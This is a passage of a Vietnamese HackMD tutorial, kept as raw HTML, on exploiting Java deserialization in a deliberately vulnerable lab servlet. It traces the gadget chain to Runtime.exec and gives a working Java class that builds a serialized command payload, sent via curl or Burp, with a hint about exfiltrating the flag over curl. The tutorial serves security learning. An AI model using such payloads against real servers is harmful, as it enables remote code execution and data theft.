<span class="image-toolbar-wrapper in-view inline-block w-fit h-fit [&amp;:not([data-image-error])]:cursor-zoom-in" data-position="47423" data-size="51" style="width: auto; height: auto;"><div class="code-toolbar cursor-default tw-hide md:block"><div class="flex flex-row gap-0.5 rounded-lg bg-element-bg-default px-[7px] py-[5px]"><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-link-button ui-code-block-toolbar-type-image" data-state="closed"><i class="inline-flex ph ph-link" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-zoom-button ui-code-block-toolbar-type-image" data-state="closed"><i class="inline-flex ph ph-magnifying-glass-plus" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button></div></div><img src="./Những điểu về lỗ hổng Java Deserialization vulnerability - HackMD_files/S11cZM0Dlg.png" alt="image" class="offline-handled error-handled image-toolbar-handled" data-position="47423" data-size="51" loading="lazy" style="width: auto; height: auto;"></span><br>
<span data-position="47475" data-size="46">Tiếp đến chúng ta xem đến source và phân tích.</span></p><p class="part" data-startline="676" data-endline="681" data-position="47523" data-size="0"><span data-position="47523" data-size="52">Trong VulnServlet.java ta thấy đoạn code quan trọng:</span><br>
<span class="image-toolbar-wrapper in-view inline-block w-fit h-fit [&amp;:not([data-image-error])]:cursor-zoom-in" data-position="47576" data-size="51" style="width: auto; height: auto;"><div class="code-toolbar cursor-default tw-hide md:block"><div class="flex flex-row gap-0.5 rounded-lg bg-element-bg-default px-[7px] py-[5px]"><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-link-button ui-code-block-toolbar-type-image" data-state="closed"><i class="inline-flex ph ph-link" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-zoom-button ui-code-block-toolbar-type-image" data-state="closed"><i class="inline-flex ph ph-magnifying-glass-plus" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button></div></div><img src="./Những điểu về lỗ hổng Java Deserialization vulnerability - HackMD_files/rkCq7fAveg.png" alt="image" class="offline-handled error-handled image-toolbar-handled" data-position="47576" data-size="51" loading="lazy" style="width: auto; height: auto;"></span><br>
<span data-position="47628" data-size="14">Ở đây ta thấy </span><code data-position="47645" data-size="24">request.getInputStream()</code><span data-position="47672" data-size="109"> lấy dữ liệu từ method POST, đó là lí do khi mình dùng Browser mình lại thấy 405 status. Kế tiếp ta thấy hàm </span><code data-position="47784" data-size="16">ois.readObject()</code><span data-position="47803" data-size="20"> được gọi ở dưới để </span><strong data-position="47823" data-size="0"><span data-position="47825" data-size="11">deserialize</span></strong><span data-position="47838" data-size="6"> biến </span><code data-position="47847" data-size="10">Object obj</code><span data-position="47860" data-size="80"> mà không kiểm tra đầu vào. Sau khi truyền vào dữ liệu, server sẽ in kết quả là </span><strong data-position="47940" data-size="0"><span data-position="47942" data-size="23">Deserialization success</span></strong><span data-position="47967" data-size="2"> +</span><code data-position="47972" data-size="24">obj.getClass().getName()</code><span data-position="48000" data-size="81">, mô phỏng cho mọi người dễ thấy được các object nào được deserialize thành công.</span><br>
<span data-position="48081" data-size="86">Sau đấy ta dễ dàng phát hiện được sink là nằm ở trong class DangerousAction với field </span><code data-position="48170" data-size="10">readObject</code><span data-position="48184" data-size="1">.</span><br>
<span class="image-toolbar-wrapper in-view inline-block w-fit h-fit [&amp;:not([data-image-error])]:cursor-zoom-in" data-position="48185" data-size="51" style="width: auto; height: auto;"><div class="code-toolbar cursor-default tw-hide md:block"><div class="flex flex-row gap-0.5 rounded-lg bg-element-bg-default px-[7px] py-[5px]"><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-link-button ui-code-block-toolbar-type-image" data-state="closed"><i class="inline-flex ph ph-link" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-zoom-button ui-code-block-toolbar-type-image" data-state="closed"><i class="inline-flex ph ph-magnifying-glass-plus" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button></div></div><img src="./Những điểu về lỗ hổng Java Deserialization vulnerability - HackMD_files/Hy7kDG0vee.png" alt="image" class="offline-handled error-handled image-toolbar-handled" data-position="48185" data-size="51" loading="lazy" style="width: auto; height: auto;"></span><br>
<span data-position="48237" data-size="108">Đây là chỗ chúng ta thấy có khả năng RCE, vì vậy ta sẽ kiếm cách để gọi. Từ đây ta có thể nối lại thành một </span><strong data-position="48345" data-size="0"><span data-position="48347" data-size="11">gadgetchain</span></strong><span data-position="48360" data-size="132"> rồi, vì đây là mô phỏng nhiều gadgetchain nên mình ví dụ thủ công cái đơn giản nhất, khi ghép lại ta sẽ có một gadgetchain như này:</span></p><div class="part code-block-wrapper code-block-toolbar-handled" data-startline="682" data-endline="697" data-infoprefix-length="4" data-position="48493"><div class="code-toolbar"><div class="flex flex-row gap-0.5 rounded-lg bg-element-bg-default px-[7px] py-[5px]"><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-link-button ui-code-block-toolbar-type-code" data-state="closed"><i class="inline-flex ph ph-link" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-button ui-code-block-toolbar-type-code" data-state="closed"><i class="inline-flex ph ph-clipboard-text" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button></div></div>
        <pre class="click-event-handled"><code class="java hljs">HTTP <span class="token class-name">POST</span> body <span class="token punctuation">(</span>payload nhị phân<span class="token punctuation">)</span>
        ↓
<span class="token class-name">VulnServlet</span><span class="token punctuation">.</span><span class="token function">doPost</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 
    → <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    → ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        ↓
<span class="token class-name">ObjectInputStream</span><span class="token operator">:</span>
    <span class="token operator">-</span> <span class="token class-name">Load</span> <span class="token keyword">class</span> <span class="token class-name">DangerousAction</span>
    <span class="token operator">-</span> <span class="token class-name">T</span>ạo instance trống
    <span class="token operator">-</span> <span class="token class-name">Set</span> <span class="token keyword">private</span> field cmd từ payload
    <span class="token operator">-</span> <span class="token class-name">T</span>ìm <span class="token operator">&amp;</span> gọi <span class="token class-name">DangerousAction</span><span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
            ↓
<span class="token class-name">DangerousAction</span><span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span>
    <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span>
</code></pre>
      </div><p class="part" data-startline="699" data-endline="699" data-position="48899" data-size="0"><span data-position="48899" data-size="87">Sau khi xác định được như vậy rồi chúng ta đến bước test, trong VulnServlet.java, dòng:</span></p><div class="part code-block-wrapper code-block-toolbar-handled" data-startline="700" data-endline="703" data-infoprefix-length="4" data-position="48987"><div class="code-toolbar"><div class="flex flex-row gap-0.5 rounded-lg bg-element-bg-default px-[7px] py-[5px]"><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-link-button ui-code-block-toolbar-type-code" data-state="closed"><i class="inline-flex ph ph-link" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-button ui-code-block-toolbar-type-code" data-state="closed"><i class="inline-flex ph ph-clipboard-text" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button></div></div>
        <pre class="click-event-handled"><code class="java hljs"><span class="token class-name">ObjectInputStream</span> ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">Object</span> obj <span class="token operator">=</span> ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
      </div><p class="part" data-startline="704" data-endline="707" data-position="49103" data-size="0"><span data-position="49103" data-size="35">ta thấy đây là một entry point, ta </span><code data-position="49141" data-size="10">ctrl+click</code><span data-position="49154" data-size="5"> vào </span><code data-position="49162" data-size="10">readObject</code><span data-position="49175" data-size="18"> thì nhảy đến lớp </span><code data-position="49196" data-size="17">ObjectInputStream</code><span class="image-toolbar-wrapper in-view inline-block w-fit h-fit [&amp;:not([data-image-error])]:cursor-zoom-in" data-position="49216" data-size="51" style="width: auto; height: auto;"><div class="code-toolbar cursor-default tw-hide md:block"><div class="flex flex-row gap-0.5 rounded-lg bg-element-bg-default px-[7px] py-[5px]"><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-link-button ui-code-block-toolbar-type-image" data-state="closed"><i class="inline-flex ph ph-link" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-zoom-button ui-code-block-toolbar-type-image" data-state="closed"><i class="inline-flex ph ph-magnifying-glass-plus" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button></div></div><img src="./Những điểu về lỗ hổng Java Deserialization vulnerability - HackMD_files/SJXqKIxdgx.png" alt="image" class="offline-handled error-handled image-toolbar-handled" data-position="49216" data-size="51" loading="lazy" style="width: auto; height: auto;"></span><br>
<span data-position="49268" data-size="13">ta thấy được </span><code data-position="49284" data-size="6">object</code><span data-position="49293" data-size="10"> ở đây là </span><strong data-position="49303" data-size="0"><span data-position="49305" data-size="14">untrusted data</span></strong><span data-position="49321" data-size="9"> đã được </span><strong data-position="49330" data-size="0"><span data-position="49332" data-size="11">deserialize</span></strong><span data-position="49345" data-size="70"> mà chúng ta truyền vào. Như vậy là khi payload của chúng ta POST lên </span><code data-position="49418" data-size="14">endpoint /vuln</code><span data-position="49436" data-size="15">,  servlet gọi </span><code data-position="49453" data-size="30">ObjectInputStream.readObject()</code><span data-position="49487" data-size="20">, mà ta thấy được ở </span><strong data-position="49506" data-size="0"><span data-position="49508" data-size="4">sink</span></strong><span data-position="49515" data-size="20">, cụ thể là ở class </span><code data-position="49537" data-size="15">DangerousAction</code><span data-position="49555" data-size="8"> có hàm </span><code data-position="49566" data-size="29">readObject(ObjectInputStream)</code><span data-position="49599" data-size="53">, như vậy bây giờ chúng ta kiếm cách để JVM gọi được </span><strong data-position="49651" data-size="0"><span data-position="49653" data-size="4">sink</span></strong><span data-position="49659" data-size="45"> là hoàn thành, chúng ta tìm hiểu thêm trong </span><code data-position="49707" data-size="17">ObjectInputStream</code><span data-position="49727" data-size="8"> có hàm </span><code data-position="49738" data-size="16">invokeReadObject</code><span data-position="49758" data-size="41">, như ở phần lí thuyết tôi đã chỉ đây là </span><strong data-position="49798" data-size="0"><span data-position="49800" data-size="10">reflection</span></strong><span data-position="49813" data-size="31">, chúng ta có thể lợi dụng gọi </span><strong data-position="49843" data-size="0"><span data-position="49845" data-size="4">sink</span></strong><span data-position="49851" data-size="6"> bằng </span><strong data-position="49857" data-size="0"><span data-position="49859" data-size="10">reflection</span></strong><span data-position="49872" data-size="1">.</span><br>
<span class="image-toolbar-wrapper in-view inline-block w-fit h-fit [&amp;:not([data-image-error])]:cursor-zoom-in" data-position="49873" data-size="51" style="width: auto; height: auto;"><div class="code-toolbar cursor-default tw-hide md:block"><div class="flex flex-row gap-0.5 rounded-lg bg-element-bg-default px-[7px] py-[5px]"><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-link-button ui-code-block-toolbar-type-image" data-state="closed"><i class="inline-flex ph ph-link" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-zoom-button ui-code-block-toolbar-type-image" data-state="closed"><i class="inline-flex ph ph-magnifying-glass-plus" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button></div></div><img src="./Những điểu về lỗ hổng Java Deserialization vulnerability - HackMD_files/S1nYpLx_ee.png" alt="image" class="offline-handled error-handled image-toolbar-handled" data-position="49873" data-size="51" loading="lazy" style="width: auto; height: auto;"></span><br>
<span data-position="49925" data-size="56">Đây là graph cho quá trình thực hiện của tôi cho dễ nhìn</span></p><div class="part code-block-wrapper code-block-toolbar-handled" data-startline="708" data-endline="721" data-infoprefix-length="4" data-position="49982"><div class="code-toolbar"><div class="flex flex-row gap-0.5 rounded-lg bg-element-bg-default px-[7px] py-[5px]"><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-link-button ui-code-block-toolbar-type-code" data-state="closed"><i class="inline-flex ph ph-link" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-button ui-code-block-toolbar-type-code" data-state="closed"><i class="inline-flex ph ph-clipboard-text" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button></div></div>
        <pre class="click-event-handled"><code class="java hljs">HTTP POST <span class="token operator">/</span>vuln
   ↓
<span class="token class-name">VulnServlet</span><span class="token punctuation">.</span><span class="token function">doPost</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
   ↓
<span class="token class-name">ObjectInputStream</span><span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
   ↓
<span class="token class-name">ObjectStreamClass</span><span class="token punctuation">.</span><span class="token function">invokeReadObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">[</span>reflection<span class="token punctuation">]</span>
   ↓
<span class="token class-name">DangerousAction</span><span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token class-name">ObjectInputStream</span><span class="token punctuation">)</span>   
   ↓
<span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span>   <span class="token punctuation">[</span>RCE <span class="token class-name">Sink</span><span class="token punctuation">]</span>

</code></pre>
      </div><p class="part" data-startline="722" data-endline="722" data-position="50234" data-size="0"><span data-position="50234" data-size="180">Sau khi xác định được gadgetchain, bạn có thể tạo ra payload của mình, lúc này chúng ta mở burp lên và chèn payload của mình thôi. Nhưng trước đấy bạn tạo được một payload như này:</span></p><div class="part code-block-wrapper code-block-toolbar-handled in-view" data-startline="723" data-endline="738" data-infoprefix-length="4" data-position="50415"><div class="code-toolbar"><div class="flex flex-row gap-0.5 rounded-lg bg-element-bg-default px-[7px] py-[5px]"><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-link-button ui-code-block-toolbar-type-code" data-state="closed"><i class="inline-flex ph ph-link" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-button ui-code-block-toolbar-type-code" data-state="closed"><i class="inline-flex ph ph-clipboard-text" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button></div></div>
        <pre class="click-event-handled"><code class="java hljs"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>vuln</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">FileOutputStream</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectOutputStream</span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CreatePayload</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>
        <span class="token class-name">DangerousAction</span> da <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DangerousAction</span><span class="token punctuation">(</span><span class="token string">"cat /flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">try</span> <span class="token punctuation">(</span><span class="token class-name">ObjectOutputStream</span> oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"payload.bin"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>da<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Payload đã được tạo: payload.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
      </div><p class="part in-view" data-startline="739" data-endline="743" data-position="50901" data-size="0"><span data-position="50901" data-size="29">và chạy payload này và class </span><code data-position="50933" data-size="15">DangerousAction</code><span data-position="50951" data-size="12"> để có file </span><code data-position="50966" data-size="11">payload.bin</code><span data-position="50981" data-size="30">(nhớ cẩn thận payload mới cái </span><code data-position="51013" data-size="16">serialVersionUID</code><span data-position="51032" data-size="5"> của </span><code data-position="51040" data-size="15">DangerousAction</code><span data-position="51058" data-size="12"> không khớp)</span><br>
<span class="image-toolbar-wrapper in-view inline-block w-fit h-fit [&amp;:not([data-image-error])]:cursor-zoom-in" data-position="51071" data-size="51" style="width: auto; height: auto;"><div class="code-toolbar cursor-default tw-hide md:block"><div class="flex flex-row gap-0.5 rounded-lg bg-element-bg-default px-[7px] py-[5px]"><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-link-button ui-code-block-toolbar-type-image" data-state="closed"><i class="inline-flex ph ph-link" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-zoom-button ui-code-block-toolbar-type-image" data-state="closed"><i class="inline-flex ph ph-magnifying-glass-plus" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button></div></div><img src="./Những điểu về lỗ hổng Java Deserialization vulnerability - HackMD_files/SkVUKDlOxg.png" alt="image" class="offline-handled error-handled image-toolbar-handled" data-position="51071" data-size="51" loading="lazy" style="width: auto; height: auto;"></span><br>
<span data-position="51123" data-size="102">chúng ta curl thử và thấy website trả về như này là thành công, lúc này ta mở burp lên và import file </span><code data-position="51228" data-size="11">payload.bin</code><span data-position="51242" data-size="100"> này vào repeater để xem như nào (bạn nhớ đổi Content-Type: thành application/octet-stream), như này</span><br>
<span class="image-toolbar-wrapper in-view inline-block w-fit h-fit [&amp;:not([data-image-error])]:cursor-zoom-in" data-position="51343" data-size="51" style="width: auto; height: auto;"><div class="code-toolbar cursor-default tw-hide md:block"><div class="flex flex-row gap-0.5 rounded-lg bg-element-bg-default px-[7px] py-[5px]"><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-link-button ui-code-block-toolbar-type-image" data-state="closed"><i class="inline-flex ph ph-link" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-zoom-button ui-code-block-toolbar-type-image" data-state="closed"><i class="inline-flex ph ph-magnifying-glass-plus" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button></div></div><img src="./Những điểu về lỗ hổng Java Deserialization vulnerability - HackMD_files/rkYZ5Dg_xx.png" alt="image" class="offline-handled error-handled image-toolbar-handled" data-position="51343" data-size="51" loading="lazy" style="width: auto; height: auto;"></span><br>
<span data-position="51395" data-size="81">Khi đến bước này thì ta thấy được payload đã chạy theo ý mình muốn, đã chạy được </span><code data-position="51479" data-size="12">readObject()</code><span data-position="51494" data-size="5"> của </span><code data-position="51502" data-size="15">DangerousAction</code><span data-position="51520" data-size="4"> và </span><code data-position="51527" data-size="30">Runtime.getRuntime().exec(cmd)</code><span data-position="51560" data-size="195"> cũng đang thực thi nhưng không hiện output, vì đã RCE thành công việc xem flag các bạn tự làm tiếp, một số cách bạn xem được có thể curl flag ra ngoài hay input một file mới trong server và xem.</span></p><p class="part in-view" data-startline="745" data-endline="751" data-position="51757" data-size="0"><span data-position="51757" data-size="110">Phần trên là mình hướng dẫn sơ cách mà làm thủ công, trên thực tế thì mình phải phân tích và đi qua rất nhiều </span><strong data-position="51867" data-size="0"><span data-position="51869" data-size="6">gadget</span></strong><span data-position="51878" data-size="42">, ví dụ như không được đi thẳng đến class </span><code data-position="51922" data-size="15">DangerousAction</code><span data-position="51940" data-size="22"> mà phải dùng công cụ </span><strong data-position="51962" data-size="0"><span data-position="51964" data-size="9">Ysoserial</span></strong><span data-position="51975" data-size="90"> thì sao, sau đây mình sẽ hướng dẫn các bạn xài công cụ này như nào. Đầu tiên ta vẫn thấy </span><strong data-position="52065" data-size="0"><span data-position="52067" data-size="6">source</span></strong><span data-position="52075" data-size="66"> vẫn là chỗ cũ, mình không nói lại nữa, bây giờ mình thử xem file </span><strong data-position="52141" data-size="0"><span data-position="52143" data-size="10">Utils.java</span></strong><span data-position="52155" data-size="38"> xem có gì không, ta thấy được có một </span><strong data-position="52193" data-size="0"><span data-position="52195" data-size="12">magic method</span></strong><span data-position="52209" data-size="4"> là </span><code data-position="52216" 